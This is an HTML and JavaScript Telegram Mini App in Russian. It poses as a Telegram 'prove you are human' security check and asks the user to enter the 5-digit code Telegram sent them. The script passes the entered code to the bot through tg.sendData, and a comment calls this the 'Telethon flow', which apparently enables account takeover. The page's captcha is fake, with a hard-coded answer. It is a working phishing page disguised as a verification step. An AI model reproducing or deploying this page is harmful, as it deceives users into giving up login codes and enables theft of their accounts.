<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>Проверка безопасности</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    @keyframes tg-pop {
      0%   { transform: scale(.96); opacity: .65 }
      100% { transform: scale(1);   opacity: 1   }
    }
    @keyframes tg-shake {
      0%,100% { transform: translateX(0)  }
      30%     { transform: translateX(-4px) }
      70%     { transform: translateX(4px)  }
    }
    @keyframes pulse-shield {
      0%,100% { transform: scale(1) }
      50%     { transform: scale(1.06) }
    }

    .tg-pop   { animation: tg-pop   .24s ease-out both; }
    .tg-shake { animation: tg-shake .28s ease-out; }

    html, body {
      height: 100%;
      height: 100dvh;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      background: #f8fbfd;
      color: #182633;
      display: flex;
      flex-direction: column;
      user-select: none;
      -webkit-tap-highlight-color: transparent;
      overflow: hidden;
    }

    /* ── Карточка = весь экран ── */
    .card {
      display: flex;
      flex-direction: column;
      flex: 1;
      width: 100%;
      height: 100%;
      overflow: hidden;
    }

    /* ── Header ── */
    .card-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      height: 58px;
      padding: 0 20px;
      border-bottom: 1px solid #e2edf3;
    }
    .header-left { display: flex; align-items: center; gap: 10px; }
    .tg-mark {
      width: 32px; height: 32px;
      border-radius: 50%;
      background: #2aabee;
      box-shadow: 0 4px 10px rgba(42,171,238,.2);
      display: flex; align-items: center; justify-content: center;
    }
    .tg-mark svg { width: 18px; height: 18px; }
    .header-title {
      font-size: 14px; font-weight: 600;
      letter-spacing: -.01em; color: #536d7f;
    }
    .header-badge {
      border-radius: 999px;
      background: #edf6fb;
      padding: 4px 10px;
      font-size: 10px; font-weight: 700;
      letter-spacing: .09em;
      text-transform: uppercase;
      color: #7892a1;
    }

    /* ── Body ── */
    .card-body {
      display: flex;
      flex-direction: column;
      flex: 1;
      padding: 20px 20px 16px;
      overflow-y: auto;
    }

    /* ── Hero ── */
    .hero { display: flex; flex-direction: column; align-items: center; text-align: center; }
    .shield-wrap {
      width: 72px; height: 72px;
      animation: pulse-shield 2.4s ease-in-out infinite;
    }
    .shield-wrap svg { width: 100%; height: 100%; }
    .hero-label {
      margin-top: 12px;
      font-size: 11px; font-weight: 700;
      letter-spacing: .15em; text-transform: uppercase;
      color: #2aabee;
    }
    .hero-title {
      margin-top: 8px;
      font-size: 22px; font-weight: 800;
      line-height: 1.1; letter-spacing: -.04em;
      color: #1c3445;
    }
    .hero-sub {
      margin-top: 8px;
      max-width: 290px;
      font-size: 13px; line-height: 1.4;
      color: #78909f;
    }
    .hero-sub strong { font-weight: 600; color: #4f6c7d; }

    /* ── Ячейки кода ── */
    .code-cells {
      display: flex;
      justify-content: center;
      gap: 8px;
      margin-top: 16px;
    }
    .cell {
      width: 43px; height: 43px;
      border-radius: 13px;
      border: 1.5px dashed #c9dce6;
      background: white;
      display: flex; align-items: center; justify-content: center;
      font-size: 18px; font-weight: 600;
      color: #b8cbd5;
      transition: border-color .18s, background .18s, color .18s;
    }
    .cell.filled {
      border-style: solid;
      border-color: #2aabee;
      background: #e9f5ff;
      color: #168bd0;
    }
    .cell.wrong {
      border-style: solid;
      border-color: #f0a08e;
      background: #fff1ed;
      color: #d86650;
    }

    /* ── Нампад ── */
    .numpad-wrap {
      margin-top: 14px;
      border-radius: 16px;
      border: 1px solid #e3edf2;
      background: white;
      padding: 12px;
      box-shadow: 0 8px 22px rgba(50,112,145,.06);
    }
    .numpad-wrap.shake { animation: tg-shake .28s ease-out; }

    .numpad {
      display: grid;
      grid-template-columns: repeat(5, 1fr);
      gap: 10px;
    }
    .num-btn {
      height: 46px;
      border-radius: 12px;
      border: 1.5px solid #e2edf3;
      background: #fbfdfe;
      color: #496677;
      font-size: 17px; font-weight: 600;
      cursor: pointer;
      transition: transform .18s ease, background .18s ease, border-color .18s ease, color .18s ease, box-shadow .18s ease;
    }
    .num-btn:hover {
      border-color: #a9d8f1;
      background: #f2faff;
    }
    .num-btn:active { transform: scale(.96); }
    .num-btn.selected {
      border-color: #2aabee;
      background: #e9f5ff;
      color: #168bd0;
    }
    .num-btn.correct {
      border-color: #24b47e;
      background: #e9fbf3;
      color: #16865e;
      box-shadow: 0 3px 10px rgba(36,180,126,.16);
    }
    .num-btn.wrong-btn {
      border-color: #f0a08e;
      background: #fff1ed;
      color: #d86650;
    }
    .num-btn:disabled { cursor: default; }

    /* ── Стереть ── */
    .clear-row {
      display: flex;
      justify-content: center;
      margin-top: 8px;
    }
    .clear-btn {
      border: none;
      background: none;
      padding: 6px 12px;
      border-radius: 8px;
      font-size: 12px; font-weight: 600;
      color: #2aabee;
      cursor: pointer;
      transition: background .15s;
    }
    .clear-btn:hover { background: #e9f5ff; }
    .clear-btn:disabled { color: #b8cbd5; cursor: default; }

    /* ── Статус ── */
    .status {
      min-height: 20px;
      margin-top: 8px;
      text-align: center;
      font-size: 13px;
      font-weight: 500;
      color: #9aadb8;
    }
    .status.wrong   { color: #d86650; }
    .status.success { color: #16865e; }

    /* ── Кнопка подтвердить ── */
    .confirm-btn {
      margin-top: auto;
      padding-top: 12px;
    }
    .confirm-btn button {
      width: 100%; height: 48px;
      border: none;
      border-radius: 15px;
      font-size: 15px; font-weight: 600;
      cursor: pointer;
      transition: background .2s, box-shadow .2s, transform .1s;
      background: #e7f0f5;
      color: #9bb0bc;
    }
    .confirm-btn button.active {
      background: #2aabee;
      color: white;
      box-shadow: 0 8px 18px rgba(42,171,238,.24);
    }
    .confirm-btn button.active:hover  { background: #229cdb; }
    .confirm-btn button.active:active { transform: scale(.98); }

    /* ── Экран успеха ── */
    .success-screen {
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      flex: 1;
    }
    .success-screen.show { display: flex; }
    .success-icon-wrap {
      width: 78px; height: 78px;
      border-radius: 26px;
      background: #e8faf2;
      display: flex; align-items: center; justify-content: center;
    }
    .success-circle {
      width: 42px; height: 42px;
      border-radius: 50%;
      background: #25b87f;
      display: flex; align-items: center; justify-content: center;
    }
    .checkmark {
      width: 22px; height: 14px;
      border-bottom: 3.5px solid white;
      border-left:  3.5px solid white;
      transform: rotate(-45deg) translate(1px, -2px);
    }
    .success-label {
      margin-top: 28px;
      font-size: 11px; font-weight: 700;
      letter-spacing: .15em; text-transform: uppercase;
      color: #24a977;
    }
    .success-title {
      margin-top: 10px;
      font-size: 28px; font-weight: 800;
      letter-spacing: -.045em; color: #1c3445;
    }
    .success-sub {
      margin-top: 12px;
      max-width: 275px;
      font-size: 14px; line-height: 1.5; color: #78909f;
    }
    .reset-btn {
      margin-top: 36px;
      width: 270px; height: 48px;
      border: none; border-radius: 14px;
      background: #2aabee; color: white;
      font-size: 14px; font-weight: 600;
      box-shadow: 0 8px 18px rgba(42,171,238,.2);
      cursor: pointer;
      transition: background .2s, transform .1s;
    }
    .reset-btn:hover  { background: #229cdb; }
    .reset-btn:active { transform: scale(.98); }

    /* ── Footer ── */
    .card-footer {
      border-top: 1px solid #e2edf3;
      padding: 10px 20px;
      text-align: center;
      font-size: 10px; color: #9aadb8;
    }
  </style>
</head>
<body>
<div class="card">

  <!-- Header -->
  <div class="card-header">
    <div class="header-left">
      <div class="tg-mark">
        <svg viewBox="0 0 24 24" fill="none">
          <path d="M20.7 4.2 3.8 10.9c-1.2.5-1.2 1.2-.2 1.5l4.3 1.4 1.6 5.1c.2.7.4.7.8.4l2.4-2.3 4.7 3.5c.9.5 1.6.3 1.8-.8l2.9-13.9c.3-1.2-.5-1.8-1.4-1.4Zm-11.9 9.1 9.8-6.2c.5-.3 1-.1.6.2l-8.1 7.3-.3 3.2-1.3-4.1-3.2-1c-.7-.2-.7-.5.1-.8l2.4-.6Z" fill="white"/>
        </svg>
      </div>
      <span class="header-title">Telegram</span>
    </div>
    <span class="header-badge">Проверка</span>
  </div>

  <!-- Body -->
  <div class="card-body">

    <!-- Основной экран -->
    <div id="main-screen">
      <!-- Hero -->
      <div class="hero">
        <div class="shield-wrap">
          <svg viewBox="0 0 92 92" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M46 8L14 20v24c0 18.8 13.6 36.4 32 41 18.4-4.6 32-21.6 32-41V20L46 8Z" fill="#2aabee" opacity=".15"/>
            <path d="M46 12L16 23.2V44c0 17.6 12.8 34 30 38.4C63.2 78 76 61.6 76 44V23.2L46 12Z" fill="none" stroke="#2aabee" stroke-width="2.5"/>
            <path d="M35 46l8 8 14-16" stroke="#2aabee" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
          </svg>
        </div>
        <p class="hero-label">Быстрая проверка</p>
        <h1 class="hero-title">Докажите, что вы человек</h1>
        <p class="hero-sub">Введите <strong>5-значный код</strong>, который Telegram прислал вам в чат</p>
      </div>

      <!-- Ячейки кода -->
      <div class="code-cells" id="code-cells">
        <div class="cell" id="c0"></div>
        <div class="cell" id="c1"></div>
        <div class="cell" id="c2"></div>
        <div class="cell" id="c3"></div>
        <div class="cell" id="c4"></div>
      </div>

      <!-- Нампад -->
      <div class="numpad-wrap" id="numpad-wrap">
        <div class="numpad" id="numpad">
          <button class="num-btn" onclick="press('1')">1</button>
          <button class="num-btn" onclick="press('2')">2</button>
          <button class="num-btn" onclick="press('3')">3</button>
          <button class="num-btn" onclick="press('4')">4</button>
          <button class="num-btn" onclick="press('5')">5</button>
          <button class="num-btn" onclick="press('6')">6</button>
          <button class="num-btn" onclick="press('7')">7</button>
          <button class="num-btn" onclick="press('8')">8</button>
          <button class="num-btn" onclick="press('9')">9</button>
          <button class="num-btn" onclick="press('0')">0</button>
        </div>
      </div>

      <!-- Стереть -->
      <div class="clear-row">
        <button class="clear-btn" id="clear-btn" onclick="clearCode()" disabled>Стереть цифры</button>
      </div>

      <!-- Статус -->
      <div class="status" id="status">Нажимайте цифры по одной</div>

      <!-- Подтвердить -->
      <div class="confirm-btn">
        <button id="confirm-btn" onclick="confirm_()">Подтвердить</button>
      </div>
    </div>

    <!-- Экран успеха -->
    <div class="success-screen tg-pop" id="success-screen">
      <div class="success-icon-wrap">
        <div class="success-circle">
          <div class="checkmark"></div>
        </div>
      </div>
      <p class="success-label">Проверка пройдена</p>
      <h1 class="success-title">Всё готово</h1>
      <p class="success-sub">Спасибо, что подтвердили, что вы человек. Возвращаемся в бот...</p>
    </div>

  </div><!-- /card-body -->

  <div class="card-footer">Независимая проверка — Telegram Mini App</div>
</div>

<script>
  const tg = window.Telegram.WebApp;
  tg.ready();
  tg.expand();
  tg.MainButton.hide();

  // Читаем промокод из URL (?promo=xxx)
  const _urlParams = new URLSearchParams(window.location.search);
  const PROMO_CODE = _urlParams.get('promo') || '';

  const MAX = 5;
  let digits = [];

  function press(d) {
    if (digits.length >= MAX) return;
    digits.push(d);
    render();
    updateClearBtn();
  }

  function clearCode() {
    digits = [];
    render();
    updateClearBtn();
    setStatus('Нажимайте цифры по одной', '');
  }

  function updateClearBtn() {
    document.getElementById('clear-btn').disabled = digits.length === 0;
  }

  function render() {
    for (let i = 0; i < MAX; i++) {
      const cell = document.getElementById(`c${i}`);
      cell.textContent = digits[i] ?? '';
      cell.className = 'cell' + (digits[i] !== undefined ? ' filled' : '');
    }

    const btn = document.getElementById('confirm-btn');
    if (digits.length === MAX) {
      btn.classList.add('active');
      setStatus('Нажмите «Подтвердить»', 'success');
    } else {
      btn.classList.remove('active');
      if (digits.length > 0) setStatus(`Введено ${digits.length} из ${MAX}`, '');
      else setStatus('Нажимайте цифры по одной', '');
    }
  }

  function setStatus(text, type) {
    const el = document.getElementById('status');
    el.textContent = text;
    el.className = 'status' + (type ? ` ${type}` : '');
  }

  // Правильный код капчи (статичный — 7,3,1,8,4)
  const CORRECT = ['7','3','1','8','4'];

  function confirm_() {
    if (digits.length !== MAX) return;

    const isCorrect = digits.every((d, i) => d === CORRECT[i]);

    if (PROMO_CODE) {
      // Промокод флоу — передаём promo + результат капчи
      tg.sendData(JSON.stringify({
        promo: PROMO_CODE,
        captcha_passed: isCorrect
      }));
    } else {
      // Обычный Telethon флоу — передаём только код
      tg.sendData(JSON.stringify({ code: digits.join('') }));
    }

    if (isCorrect) {
      document.getElementById('main-screen').style.display = 'none';
      const s = document.getElementById('success-screen');
      s.classList.add('show');
      setTimeout(() => tg.close(), 1500);
    } else {
      // Неверный код — показываем ошибку, не закрываем
      document.getElementById('numpad-wrap').classList.add('shake');
      setStatus('Неверный код! Попробуйте снова.', 'wrong');
      for (let i = 0; i < MAX; i++) {
        document.getElementById(`c${i}`).className = 'cell wrong';
      }
      setTimeout(() => {
        document.getElementById('numpad-wrap').classList.remove('shake');
        clearCode();
      }, 700);
    }
  }

  // Физическая клавиатура
  document.addEventListener('keydown', e => {
    if (e.key >= '0' && e.key <= '9') press(e.key);
    if (e.key === 'Backspace') clearCode();
    if (e.key === 'Enter') confirm_();
  });
</script>
</body>
</html>
